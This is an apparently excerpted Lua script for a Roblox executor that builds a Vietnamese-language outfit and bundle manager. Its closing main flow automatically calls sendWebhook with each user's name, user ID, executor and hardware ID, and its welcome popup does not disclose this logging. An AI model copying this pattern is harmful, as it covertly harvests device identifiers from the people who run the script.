                local btnLayout = Instance.new("UIListLayout")
                btnLayout.Parent = btnsFrame
                ...
                btnApply.Parent = btnsFrame
                btnApply.BackgroundColor3 = Theme.Success
                btnApply.BackgroundTransparency = 0.15
                btnApply.Text = "▶ Áp dụng"
                btnApply.Font = Enum.Font.GothamSemibold
                btnApply.TextSize = 11
                btnApply.TextColor3 = Theme.Text
                btnApply.Size = UDim2.new(0, 75, 0, 24)
                btnApply.ZIndex = 62
                mkCorner(btnApply, 6)

                btnApply.MouseButton1Click:Connect(function()
                    applyInternalBundle(bundleName)
                end)

                -- Export button
                local btnExport = Instance.new("TextButton")
                btnExport.Parent = btnsFrame
                btnExport.BackgroundColor3 = Theme.Accent
                btnExport.BackgroundTransparency = 0.15
                btnExport.Text = "📤 Xuất"
                btnExport.Font = Enum.Font.GothamSemibold
                btnExport.TextSize = 11
                btnExport.TextColor3 = Theme.Text
                btnExport.Size = UDim2.new(0, 60, 0, 24)
                btnExport.ZIndex = 62
                mkCorner(btnExport, 6)

                btnExport.MouseButton1Click:Connect(function()
                    showExportBundleModal(bundleName, bundleData)
                end)

                -- Delete button
                local btnDelete = Instance.new("TextButton")
                btnDelete.Parent = btnsFrame
                btnDelete.BackgroundColor3 = Theme.Danger
                btnDelete.BackgroundTransparency = 0.15
                btnDelete.Text = "🗑 Xoá"
                btnDelete.Font = Enum.Font.GothamSemibold
                btnDelete.TextSize = 11
                btnDelete.TextColor3 = Theme.Text
                btnDelete.Size = UDim2.new(0, 55, 0, 24)
                btnDelete.ZIndex = 62
                mkCorner(btnDelete, 6)

                btnDelete.MouseButton1Click:Connect(function()
                    InternalBundles[bundleName] = nil
                    
                    -- Remove from global Bundle if exists
                    if Bundle and Bundle[bundleName] then
            ...
            -- Update canvas size
            task.defer(function()
                local listLayout = InternalBundlesList:FindFirstChildOfClass("UIListLayout")
                if listLayout then
                    InternalBundlesList.CanvasSize = UDim2.new(0, 0, 0, listLayout.AbsoluteContentSize.Y + 20)
                end
            end)
        end

        -- ===== CREATE INTERNAL BUNDLES PAGE =====
        local function createInternalBundlesPage()
            InternalBundlesPage = Instance.new("Frame")
            InternalBundlesPage.Name = "InternalBundles"
            InternalBundlesPage.Parent = PageFrame
            InternalBundlesPage.BackgroundTransparency = 1
            InternalBundlesPage.Size = UDim2.fromScale(1, 1)
            InternalBundlesPage.Visible = false
            InternalBundlesPage.ZIndex = 57

            local pagePad = Instance.new("UIPadding")
            pagePad.Parent = InternalBundlesPage
            ...
            header.Parent = InternalBundlesPage
            header.BackgroundColor3 = Theme.Purple
            ...
            headerIcon.TextColor3 = Theme.Text
            headerIcon.Size = UDim2.new(0, 50, 1, 0)
            headerIcon.ZIndex = 59

            local headerTitle = Instance.new("TextLabel")
            headerTitle.Parent = header
            headerTitle.BackgroundTransparency = 1
            headerTitle.Text = "Gói Nội Bộ - Bundles đã lưu"
            ...
            -- Import button
            local btnImport = Instance.new("TextButton")
            btnImport.Parent = actionsFrame
            btnImport.BackgroundColor3 = Theme.Success
            btnImport.BackgroundTransparency = 0.12
            btnImport.Text = "📥 Nhập Code"
            btnImport.Font = Enum.Font.GothamBold
            btnImport.TextSize = 13
            btnImport.TextColor3 = Theme.Text
            btnImport.Size = UDim2.new(0, 120, 0, 38)
            btnImport.ZIndex = 59
            mkCorner(btnImport, 10)

            btnImport.MouseButton1Click:Connect(showImportBundleModal)

            -- Create from username button
            local btnFromUser = Instance.new("TextButton")
            btnFromUser.Parent = actionsFrame
            btnFromUser.BackgroundColor3 = Theme.Accent
            btnFromUser.BackgroundTransparency = 0.12
            btnFromUser.Text = "👤 Từ Username"
            btnFromUser.Font = Enum.Font.GothamBold
            btnFromUser.TextSize = 13
            btnFromUser.TextColor3 = Theme.Text
            btnFromUser.Size = UDim2.new(0, 130, 0, 38)
            btnFromUser.ZIndex = 59
            mkCorner(btnFromUser, 10)

            btnFromUser.MouseButton1Click:Connect(showCreateFromUsernameModal)

            -- Bundles list
            InternalBundlesList = Instance.new("ScrollingFrame")
            InternalBundlesList.Parent = InternalBundlesPage
            InternalBundlesList.BackgroundTransparency = 1
            InternalBundlesList.BorderSizePixel = 0
            InternalBundlesList.Position = UDim2.new(0, 0, 0, 115)
            InternalBundlesList.Size = UDim2.new(1, 0, 1, -125)
            InternalBundlesList.CanvasSize = UDim2.new(0, 0, 0, 0)
            InternalBundlesList.ScrollBarThickness = 8
            InternalBundlesList.ScrollBarImageTransparency = 0.40
            InternalBundlesList.ZIndex = 58

            local listLayout = Instance.new("UIListLayout")
            listLayout.Parent = InternalBundlesList
            ...
            emptyLabel.Parent = InternalBundlesList
            emptyLabel.BackgroundTransparency = 1
            emptyLabel.Text = "Chưa có bundle nào.\nNhấn 'Nhập Code' hoặc 'Từ Username' để thêm!"
            emptyLabel.Font = Enum.Font.Gotham
            emptyLabel.TextSize = 14
            emptyLabel.TextColor3 = Theme.SubText
            emptyLabel.TextWrapped = true
            emptyLabel.Size = UDim2.new(1, 0, 0, 60)
            emptyLabel.ZIndex = 59
            ...
            task.spawn(function()
                while InternalBundlesList and InternalBundlesList.Parent do
                    ...
                    local el = InternalBundlesList:FindFirstChild("EmptyLabel")
                    if el then el.Visible = not hasItems end
                    task.wait(0.5)
                end
            end)

            return InternalBundlesPage
        end

        -- ===== BUILD MAIN UI =====
        local function buildMainUI()
            if Main:IsA("GuiButton") then
                Main.Modal = false
                Main.AutoButtonColor = false
            end
            Main.Active = false
            pcall(function() Main.Draggable = false end)

            Screen.Name = CFG.TitleText

            Main.AnchorPoint = Vector2.new(0.5, 0.5)
            Main.Position = UDim2.fromScale(0.5, 0.5)
            Main.Size = CFG.WindowSize
            Main.BackgroundTransparency = 1
            Main.Visible = false
            
            if Main:IsA("TextButton") then
                Main.Text = ""
            end
            ...
            local function updateScale()
                ...
                UIScale.Scale = math.clamp(v.X / 1920, 0.90, 1.08)
            end
            updateScale()
            ...
            ModernRoot = Instance.new("Frame")
            ModernRoot.Name = "__ModernUI"
            ModernRoot.Parent = Main
            ModernRoot.BackgroundTransparency = 1
            ModernRoot.Size = UDim2.fromScale(1, 1)
            ModernRoot.ZIndex = 50
            ModernRoot.Visible = false

            local Shell = Instance.new("Frame")
            Shell.Name = "Shell"
            Shell.Parent = ModernRoot
            Shell.BackgroundColor3 = Theme.Panel
            Shell.BackgroundTransparency = 0.04
            Shell.Size = UDim2.fromScale(1, 1)
            Shell.ZIndex = 50
            Shell.ClipsDescendants = true
            mkCorner(Shell, Theme.RadiusFrame + 2)
            mkStroke(Shell, 1, 0.65)
            ...
            Topbar.Size = UDim2.new(1, 0, 0, CFG.TopbarH)
            Topbar.ZIndex = 60
            mkCorner(Topbar, Theme.RadiusFrame)
            mkStroke(Topbar, 1, 0.74)
            ...
            -- Tone Button
            local ToneBtn = Instance.new("TextButton")
            ToneBtn.Name = "ToneButton"
            ToneBtn.Parent = Topbar
            ToneBtn.BackgroundColor3 = Theme.Warning
            ToneBtn.BackgroundTransparency = 0.20
            ToneBtn.Text = getCurrentToneText()
            ToneBtn.Font = Enum.Font.GothamSemibold
            ToneBtn.TextSize = 12
            ToneBtn.TextColor3 = Theme.Text
            ToneBtn.AnchorPoint = Vector2.new(0, 0.5)
            ToneBtn.Position = UDim2.new(0, 150, 0.5, 0)
            ToneBtn.Size = UDim2.new(0, 130, 0, 34)
            ToneBtn.ZIndex = 61
            ToneBtn.AutoButtonColor = false
            mkCorner(ToneBtn, 10)
            mkStroke(ToneBtn, 1, 0.70)
            ...
            pcall(function()
                if GUIObject.ToneButton then
                    GUIObject.ToneButton.MouseButton1Click:Connect(function()
                        task.defer(function()
                            ToneBtn.Text = getCurrentToneText()
                        end)
                    end)
            ...
            Search.Name = "GlobalSearch"
            Search.Parent = Topbar
            Search.BackgroundColor3 = Theme.Panel
            Search.BackgroundTransparency = 0.10
            Search.Text = ""
            ...
            Search.Position = UDim2.new(0.68, 0, 0.5, 0)
            Search.Size = UDim2.new(0.28, 0, 0, 36)
            Search.ZIndex = 61
            mkCorner(Search, 10)
            mkStroke(Search, 1, 0.78)
            ...
            BtnClose.Position = UDim2.new(1, 0, 0.5, 0)
            BtnClose.Size = UDim2.new(0, 44, 0, 38)
            BtnClose.ZIndex = 61
            mkCorner(BtnClose, 10)
            ...
            BtnMin.BackgroundTransparency = 0.16
            BtnMin.Text = "—"
            BtnMin.Font = Enum.Font.GothamBold
            BtnMin.TextSize = 22
            BtnMin.TextColor3 = Theme.Text
            BtnMin.AnchorPoint = Vector2.new(1, 0.5)
            BtnMin.Position = UDim2.new(1, -52, 0.5, 0)
            BtnMin.Size = UDim2.new(0, 44, 0, 38)
            BtnMin.ZIndex = 61
            mkCorner(BtnMin, 10)
            ...
            Sidebar.Position = UDim2.new(0, 0, 0, CFG.TopbarH)
            Sidebar.Size = UDim2.new(0, CFG.SidebarW, 1, -CFG.TopbarH)
            Sidebar.ZIndex = 55
            mkCorner(Sidebar, Theme.RadiusFrame)
            mkStroke(Sidebar, 1, 0.78)
            ...
            TabsLabel.TextSize = 12
            TabsLabel.TextColor3 = Theme.SubText
            ...
            Tabs.Position = UDim2.new(0, 0, 0, 18)
            Tabs.Size = UDim2.new(1, 0, 1, -18)
            Tabs.CanvasSize = UDim2.new(0, 0, 0, 0)
            Tabs.AutomaticCanvasSize = Enum.AutomaticSize.Y
            Tabs.ScrollBarThickness = 6
            Tabs.ScrollBarImageTransparency = 0.40
            Tabs.ZIndex = 56
            ...
            Content.BackgroundTransparency = 1
            Content.Position = UDim2.new(0, CFG.SidebarW, 0, CFG.TopbarH)
            Content.Size = UDim2.new(1, -CFG.SidebarW, 1, -CFG.TopbarH)
            Content.ZIndex = 55
            ...
            ContentCard.Parent = Content
            ContentCard.BackgroundColor3 = Theme.Card
            ContentCard.BackgroundTransparency = 0.10
            ContentCard.Size = UDim2.fromScale(1, 1)
            ContentCard.ZIndex = 56
            ContentCard.ClipsDescendants = true
            mkCorner(ContentCard, Theme.RadiusFrame + 2)
            mkStroke(ContentCard, 1, 0.80)

            PageFrame.Parent = ContentCard
            PageFrame.BackgroundTransparency = 1
            PageFrame.Position = UDim2.new(0, 0, 0, 0)
            PageFrame.Size = UDim2.new(1, 0, 1, 0)
            PageFrame.ZIndex = 57

            if GUIObject.CharacterPreviewFrame and GUIObject.CharacterPreviewFrame:IsA("Frame") then
                GUIObject.CharacterPreviewFrame.Visible = false
            end

            if GUIObject.ButtonFrame and GUIObject.ButtonFrame:IsA("Frame") then
                GUIObject.ButtonFrame.Position = UDim2.new(10, 0, 10, 0)
                GUIObject.ButtonFrame.Visible = true
            end
            if GUIObject.NameFrame and GUIObject.NameFrame:IsA("Frame") then
                GUIObject.NameFrame.Visible = false
            end

            local function ensureScale(pageName, scaleValue)
                local p = PageFrame:FindFirstChild(pageName)
                if p and (p:IsA("Frame") or p:IsA("ScrollingFrame")) then
                    local us = p:FindFirstChildOfClass("UIScale") or Instance.new("UIScale")
                    us.Scale = scaleValue
                    us.Parent = p
                end
            end
            
            ensureScale("Menu", CFG.LegacyScaleMenu)
            ensureScale("Menu2", CFG.LegacyScaleMenu)
            ensureScale("Menu3", CFG.LegacyScaleMenu)
            ensureScale("Catalog", CFG.LegacyScaleOther)
            ensureScale("Clothes", CFG.LegacyScaleOther)
            ensureScale("Tail", CFG.LegacyScaleOther)

            -- Create Internal Bundles page
            createInternalBundlesPage()

            local ScrollWrap = {}
            local InitialCanvasSize = {}
            
            local function computeContentHeight(page)
                local success, maxBottom = pcall(function()
                    local topY = page.AbsolutePosition.Y
                    local bottom = 0
                    for _, d in ipairs(page:GetDescendants()) do
                        if d:IsA("GuiObject") and d.Visible then
                            local by = (d.AbsolutePosition.Y + d.AbsoluteSize.Y) - topY
                            if by > bottom then bottom = by end
                        end
                    end
                    return bottom
                end)
                return success and math.max(0, maxBottom) or 0
            end

            local function makeScrollablePage(legacyPage)
                if ScrollWrap[legacyPage.Name] then return ScrollWrap[legacyPage.Name] end

                local wrap = Instance.new("ScrollingFrame")
                wrap.Name = "__ScrollWrap_" .. legacyPage.Name
                wrap.Parent = PageFrame
                wrap.BackgroundTransparency = 1
                wrap.BorderSizePixel = 0
                wrap.Position = legacyPage.Position
                wrap.Size = legacyPage.Size
                wrap.ZIndex = legacyPage.ZIndex
                wrap.ScrollBarThickness = 10
                wrap.ScrollBarImageTransparency = 0.35
                wrap.CanvasSize = UDim2.new(0, 0, 0, 0)
                wrap.ScrollingDirection = Enum.ScrollingDirection.Y
                wrap.ElasticBehavior = Enum.ElasticBehavior.WhenScrollable

                legacyPage.Parent = wrap
                legacyPage.Position = UDim2.new(0, 0, 0, 0)
                legacyPage.Visible = true

                ScrollWrap[legacyPage.Name] = wrap
                ...
                local function refresh()
                    task.defer(function()
                        ...
                        task.wait()
                        local h = computeContentHeight(legacyPage)
                        local newHeight = math.max(h + 18, wrap.AbsoluteSize.Y)
                        
                        if not hasInitialized then
                            InitialCanvasSize[legacyPage.Name] = newHeight
                            wrap.CanvasSize = UDim2.new(0, 0, 0, newHeight)
                            hasInitialized = true
                        elseif newHeight > (InitialCanvasSize[legacyPage.Name] or 0) then
                            InitialCanvasSize[legacyPage.Name] = newHeight
                            wrap.CanvasSize = UDim2.new(0, 0, 0, newHeight)
                        end
                    end)
                ...
                legacyPage.DescendantAdded:Connect(refresh)
                refresh()
            ...
            if GUIObject.ButtonFrame and GUIObject.ButtonFrame:IsA("Frame") then
                local idx = 0
                for _, b in ipairs(GUIObject.ButtonFrame:GetChildren()) do
            ...
            local Pages = {}
            for _, ch in ipairs(PageFrame:GetChildren()) do
                if (ch:IsA("Frame") or ch:IsA("ScrollingFrame")) and ch.Name ~= "InternalBundles" then
                    local legacy = ch
                    local container = legacy
                    if CFG.ScrollablePages[legacy.Name] and legacy:IsA("Frame") then
                        container = makeScrollablePage(legacy)
                    end
                    table.insert(Pages, {container = container, legacy = legacy})
                end
            end

            table.sort(Pages, function(a, b)
                local nameA = a.legacy.Name or ""
                local nameB = b.legacy.Name or ""
                local oa = orderMap[nameA] or 999
                local ob = orderMap[nameB] or 999
                if oa ~= ob then return oa < ob end
                return nameA < nameB
            end)

            -- Add Internal Bundles page after Bundles
            local internalBundlesRec = {container = InternalBundlesPage, legacy = InternalBundlesPage}
            local insertIdx = 1
            for i, rec in ipairs(Pages) do
                if rec.legacy.Name == "Bundles" then
                    insertIdx = i + 1
                    break
                end
            end
            table.insert(Pages, insertIdx, internalBundlesRec)

            local CurrentPageRec = nil
            local CurrentSearchTarget = nil
            local internalSync = false
            local TabButtons = {}

            local function findSearchBox(root)
                if not root then return nil end
                local byName = root:FindFirstChild("ClothesSearch", true) or
                    root:FindFirstChild("BundleSearch", true) or
                    root:FindFirstChild("UsernameTextbox", true) or
                    root:FindFirstChild("SearchBox", true) or
                    root:FindFirstChild("Search", true)
                if byName and byName:IsA("TextBox") then return byName end

                for _, d in ipairs(root:GetDescendants()) do
                    if d:IsA("TextBox") then
                        local n = (d.Name or ""):lower()
                        local ph = (d.PlaceholderText or ""):lower()
                        if n:find("search", 1, true) or ph:find("search", 1, true) then
                            return d
                        end
                    end
                end
            ...
            local function setSelected(btn)
                for _, b in ipairs(TabButtons) do
                    tween(b, 0.10, {BackgroundTransparency = 0.14})
                    local bar = b:FindFirstChild("AccentBar")
                    if bar then bar.Visible = false end
                end
                if btn then
                    tween(btn, 0.10, {BackgroundTransparency = 0.04})
                    local bar = btn:FindFirstChild("AccentBar")
                    if bar then bar.Visible = true end
                end
            end

            local function setPage(rec, btn)
                if CurrentPageRec == rec then 
                    return
                end
                
                for _, r in ipairs(Pages) do
                    r.container.Visible = (r == rec)
                end
                CurrentPageRec = rec
                setSelected(btn)

                local lname = rec and rec.legacy and rec.legacy.Name
                if lname and ScrollWrap[lname] then
                    task.defer(function()
                        local wrap = ScrollWrap[lname]
                        if wrap and rec.legacy then
                            task.wait()
                            if InitialCanvasSize[lname] then
                                wrap.CanvasSize = UDim2.new(0, 0, 0, InitialCanvasSize[lname])
                            else
                                local h = computeContentHeight(rec.legacy)
                                local newHeight = math.max(h + 18, wrap.AbsoluteSize.Y)
                                InitialCanvasSize[lname] = newHeight
                                wrap.CanvasSize = UDim2.new(0, 0, 0, newHeight)
                            end
                        end
                    end)
                ...
                CurrentSearchTarget = findSearchBox(rec and rec.container)
                internalSync = true
                Search.Text = (CurrentSearchTarget and CurrentSearchTarget.Text) or ""
                internalSync = false
            end

            local function makeTabButton(rec, order)
                local legacyName = rec.legacy.Name
                local isInternal = legacyName == "InternalBundles"
                
                local btn = Instance.new("TextButton")
                btn.Parent = Tabs
                btn.BackgroundColor3 = isInternal and Theme.Purple or Theme.Panel
                btn.BackgroundTransparency = 0.14
                btn.Text = TabVN[legacyName] or translateText(legacyName) or legacyName
                btn.Font = Enum.Font.GothamSemibold
                btn.TextSize = 14
                btn.TextColor3 = Theme.Text
                btn.Size = UDim2.new(1, 0, 0, CFG.TabBtnH)
                btn.AutoButtonColor = false
                btn.LayoutOrder = order or 0
                btn.ZIndex = 57
                mkCorner(btn, Theme.RadiusBtn)
                mkStroke(btn, 1, 0.80)
                pcall(function() btn.TextTruncate = Enum.TextTruncate.AtEnd end)

                local bar = Instance.new("Frame")
                bar.Name = "AccentBar"
                bar.Parent = btn
                bar.BackgroundColor3 = isInternal and Theme.Purple or Theme.Accent
            ...
            local firstBtn = nil
            for i, rec in ipairs(Pages) do
                local b = makeTabButton(rec, i)
                if not firstBtn then firstBtn = b end
            end

            local found = nil
            for _, rec in ipairs(Pages) do
                if rec.container.Visible then
                    found = rec
                    break
                end
            end
            setPage(found or Pages[1], firstBtn)

            Search:GetPropertyChangedSignal("Text"):Connect(function()
                if internalSync then return end
                if CurrentSearchTarget and CurrentSearchTarget:IsA("TextBox") then
                    CurrentSearchTarget.Text = Search.Text
                end
            end)

            Dock = Instance.new("TextButton")
            Dock.Name = "DockButton"
            Dock.Parent = Screen
            Dock.BackgroundColor3 = Theme.Accent
            Dock.BackgroundTransparency = 0.10
            Dock.Text = "☰ Mở"
            Dock.Font = Enum.Font.GothamBold
            Dock.TextSize = 15
            Dock.TextColor3 = Theme.Text
            Dock.Position = CFG.DockDefaultPos
            Dock.Size = UDim2.new(0, 70, 0, 50)
            Dock.Visible = false
            Dock.AutoButtonColor = false
            Dock.Active = true
            Dock.ZIndex = 999
            mkCorner(Dock, 14)
            mkStroke(Dock, 1, 0.78)
            makeDraggable(Dock, Dock)

            local function hideUI()
                ModernRoot.Visible = false
                Main.Visible = false
                if Main:IsA("GuiButton") then Main.Modal = false end
                Main.Active = false
                pcall(function() Main.Draggable = false end)
                Dock.Visible = true
            end
            ...
            BtnMin.MouseButton1Click:Connect(hideUI)
            BtnClose.MouseButton1Click:Connect(hideUI)
            Dock.MouseButton1Click:Connect(showUI)

            local function getCurrentBundleName()
                local success, name = pcall(function()
                    if PlayerData and SelectPlayer and PlayerData[SelectPlayer] then
                        return PlayerData[SelectPlayer].CurrentBundle
                    end
                    return nil
                end)
            ...
            local function reorderClothesForBundle(bundleName)
                if not CFG.BundlePinsClothesToTop then return end
                pcall(function()
                    if not GUIObject or not GUIObject.ClothesButtonFrame then return end
                    
                    local bundleData = nil
                    if Bundle and bundleName then
                        bundleData = Bundle[bundleName]
                    end
                    if not bundleData and InternalBundles and bundleName then
                        bundleData = InternalBundles[bundleName]
                    end
                    
                    if not bundleData then
                        for _, it in ipairs(GUIObject.ClothesButtonFrame:GetChildren()) do
                            if it:IsA("Frame") then it.LayoutOrder = 0 end
                        end
                        return
                    end
                    
                    local list = bundleData.Clothing
                    if type(list) ~= "table" then return end
                    local pos = {}
                    for i, nm in ipairs(list) do pos[nm] = i end

                    for _, it in ipairs(GUIObject.ClothesButtonFrame:GetChildren()) do
                        if it:IsA("Frame") then
                            local idx = pos[it.Name]
                            if idx then
                                it.LayoutOrder = -10000 + idx
                            else
                                it.LayoutOrder = 0
                            end
                        end
            ...
            local function hookBundleButtons()
                pcall(function()
                    if not GUIObject or not GUIObject.BundlesButtonFrame then return end
                    
                    for _, frame in ipairs(GUIObject.BundlesButtonFrame:GetChildren()) do
                        if frame:IsA("Frame") and not frame:GetAttribute("__PatchHookedBundle") then
                            frame:SetAttribute("__PatchHookedBundle", true)
                            local tb = frame:FindFirstChildOfClass("TextButton")
                            if tb then
                                tb.MouseButton1Click:Connect(function()
                                    task.defer(function()
                                        task.wait()
                                        reorderClothesForBundle(getCurrentBundleName())
                                    end)
                                end)
                            end
                        end
                    ...
                    GUIObject.BundlesButtonFrame.ChildAdded:Connect(function(ch)
                        task.defer(function()
                            task.wait()
                            if ch and ch:IsA("Frame") and not ch:GetAttribute("__PatchHookedBundle") then
                                ch:SetAttribute("__PatchHookedBundle", true)
                                local tb = ch:FindFirstChildOfClass("TextButton")
                                if tb then
                                    tb.MouseButton1Click:Connect(function()
                                        task.defer(function()
                                            task.wait()
            ...
            local lastBundle = nil
            RunService.Heartbeat:Connect(function()
                local cur = getCurrentBundleName()
                if cur ~= lastBundle then
                    lastBundle = cur
                    task.defer(function()
                        reorderClothesForBundle(cur)
                    end)
                end
            end)
            ...
            task.spawn(function()
                while task.wait(0.5) do
                    pcall(function()
                        if ToneBtn and ToneBtn.Parent then
                            ToneBtn.Text = getCurrentToneText()
                        end
                    end)
                end
            ...
            normalizeCorners(Shell, Theme.RadiusFrame)

            Shell.DescendantAdded:Connect(function(d)
                task.defer(function()
                    styleText(d)
                    styleSurface(d)
                    hookText(d)
                    if d:IsA("UICorner") then
                        d.CornerRadius = UDim.new(0, Theme.RadiusFrame)
        ...
        local function showMainUI()
            if ModernRoot then ModernRoot.Visible = true end
            Main.Visible = true
        end
        ...
        local function showWelcomePopup()
            ...
            card.AnchorPoint = Vector2.new(0.5, 0.5)
            card.Position = UDim2.fromScale(0.5, 0.5)
            card.Size = UDim2.new(0, 520, 0, 340)
            card.BackgroundColor3 = Theme.Panel
            card.BackgroundTransparency = 0.05
            card.ZIndex = 2002
            mkCorner(card, 16)
            mkStroke(card, 1, 0.65)
            ...
            title.Parent = card
            title.BackgroundTransparency = 1
            title.Text = "🇻🇳 Chào mừng từ Vietnam"
            title.Font = Enum.Font.GothamBold
            title.TextSize = 20
            title.TextColor3 = Theme.Text
            title.TextXAlignment = Enum.TextXAlignment.Left
            ...
            local displayHWID = string.sub(tostring(playerHWID), 1, 25)
            if #tostring(playerHWID) > 25 then
            ...
            desc.ZIndex = 2003
            desc.Text = "Script độc quyền được tạo bởi cộng đồng tại:\n" ..
                CFG.DiscordInvite .. "\n\n" ..
                "👤 User: " .. playerDisplayName .. " (@" .. playerUsername .. ")\n" ..
                "⚙️ Executor: " .. playerExecutor .. "\n" ..
                "🔐 HWID: " .. displayHWID

            local infoBox = Instance.new("Frame")
            infoBox.Parent = card
            infoBox.BackgroundColor3 = Theme.Success
            infoBox.BackgroundTransparency = 0.85
            infoBox.Size = UDim2.new(1, 0, 0, 60)
            infoBox.Position = UDim2.new(0, 0, 0, 145)
            infoBox.ZIndex = 2003
            mkCorner(infoBox, 10)
            ...
            infoIcon.Size = UDim2.new(0, 50, 1, 0)
            infoIcon.Position = UDim2.new(0, 10, 0, 0)
            infoIcon.ZIndex = 2004
            ...
            infoText.TextColor3 = Theme.Success
            infoText.Size = UDim2.new(1, -70, 1, 0)
            infoText.Position = UDim2.new(0, 60, 0, 0)
            infoText.ZIndex = 2004
            infoText.Text = "Phiên bản PUBLIC - Ai cũng có thể sử dụng!\nNhấn Tiếp tục để bắt đầu."
            ...
            feedback.Position = UDim2.new(0, 0, 0, 215)
            feedback.ZIndex = 2003

            local btnContinue = Instance.new("TextButton")
            btnContinue.Parent = card
            btnContinue.BackgroundColor3 = Theme.Success
            btnContinue.BackgroundTransparency = 0.12
            btnContinue.Text = "✓ Tiếp tục"
            btnContinue.Font = Enum.Font.GothamBold
            btnContinue.TextSize = 16
            btnContinue.TextColor3 = Theme.Text
            btnContinue.Size = UDim2.new(0, 150, 0, 44)
            btnContinue.Position = UDim2.new(0, 0, 1, -44)
            btnContinue.ZIndex = 2003
            mkCorner(btnContinue, 12)
            ...
            btnClose.TextColor3 = Theme.Text
            btnClose.Size = UDim2.new(0, 100, 0, 44)
            btnClose.Position = UDim2.new(0, 160, 1, -44)
            btnClose.ZIndex = 2003
            mkCorner(btnClose, 12)

            local btnCopyHWID = Instance.new("TextButton")
            btnCopyHWID.Parent = card
            btnCopyHWID.BackgroundColor3 = Theme.Card
            btnCopyHWID.BackgroundTransparency = 0.10
            btnCopyHWID.Text = "📋 HWID"
            btnCopyHWID.Font = Enum.Font.GothamSemibold
            btnCopyHWID.TextSize = 13
            btnCopyHWID.TextColor3 = Theme.Text
            btnCopyHWID.Size = UDim2.new(0, 90, 0, 44)
            btnCopyHWID.Position = UDim2.new(1, -195, 1, -44)
            btnCopyHWID.ZIndex = 2003
            mkCorner(btnCopyHWID, 12)
            mkStroke(btnCopyHWID, 1, 0.80)

            local btnCopyDiscord = Instance.new("TextButton")
            btnCopyDiscord.Parent = card
            btnCopyDiscord.BackgroundColor3 = Theme.Card
            btnCopyDiscord.BackgroundTransparency = 0.10
            btnCopyDiscord.Text = "📋 Discord"
            btnCopyDiscord.Font = Enum.Font.GothamSemibold
            btnCopyDiscord.TextSize = 13
            btnCopyDiscord.TextColor3 = Theme.Text
            btnCopyDiscord.Size = UDim2.new(0, 95, 0, 44)
            btnCopyDiscord.Position = UDim2.new(1, -95, 1, -44)
            btnCopyDiscord.ZIndex = 2003
            mkCorner(btnCopyDiscord, 12)
            mkStroke(btnCopyDiscord, 1, 0.80)

            local function showFeedback(text, success)
                feedback.Text = text
                feedback.TextColor3 = success and Theme.Success or Theme.Danger
                feedback.TextTransparency = 0
                task.delay(2.5, function()
                    if feedback and feedback.Parent then
                        tween(feedback, 0.3, {TextTransparency = 1})
                    end
                end)
            end

            btnCopyHWID.MouseButton1Click:Connect(function()
                local ok = pcall(function()
                    if setclipboard then setclipboard(playerHWID) end
                end)
                showFeedback(ok and "✅ Đã copy HWID!" or "❌ Lỗi copy", ok)
            end)

            btnCopyDiscord.MouseButton1Click:Connect(function()
                local ok = pcall(function()
                    if setclipboard then setclipboard(CFG.DiscordInvite) end
                end)
                showFeedback(ok and "✅ Đã copy Discord!" or "❌ Lỗi copy", ok)
            end)
        ...
        -- ===== MAIN FLOW =====
        print("[R3MinhTri] 🔧 Đang xây dựng giao diện...")
        buildMainUI()
        
        print("[R3MinhTri] 📤 Đang gửi webhook log...")
        sendWebhook(playerDisplayName, playerUsername, playerUserId, playerExecutor, playerHWID)
        
        print("[R3MinhTri] ✅ Script sẵn sàng!")
